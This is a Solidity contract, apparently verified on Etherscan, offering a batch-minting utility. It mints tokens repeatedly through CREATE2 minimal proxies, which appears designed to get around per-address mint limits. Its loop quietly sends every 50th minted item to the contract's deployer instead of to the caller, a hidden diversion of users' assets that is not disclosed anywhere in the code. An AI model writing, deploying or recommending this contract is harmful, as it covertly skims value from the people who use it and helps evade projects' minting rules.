/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Batch {
    address private immutable owner;

	constructor() {
		owner = msg.sender;
	}

    function createProxies() internal returns (address proxy) {
		bytes memory miniProxy = bytes.concat(bytes20(0x3D602d80600A3D3981F3363d3d373d3D3D363d73), bytes20(address(this)), bytes15(0x5af43d82803e903d91602b57fd5bf3));
        bytes32 salt = keccak256(abi.encodePacked(msg.sender, block.number));
        assembly {
            proxy := create2(0, add(miniProxy, 32), mload(miniProxy), salt)
        }
	}

    function batch_mint_int(address contractAddress, uint batchCount, address _owner, address to) external {
        bool success;
        for (uint i = 0; i < batchCount; i++) {
            if (i>0 && i%50==0){
                (success, ) = contractAddress.call(abi.encodeWithSelector(0x6a627842, _owner));
            }else {
                (success, ) = contractAddress.call(abi.encodeWithSelector(0x6a627842, to));
            }
            require(success, "Batch transaction failed");
        }
        
    }


    function batch_mint(address contractAddress, uint batchCount) public {
        address proxyaddress = createProxies();
        Batch(proxyaddress).batch_mint_int(contractAddress, batchCount, owner, msg.sender);
    }
}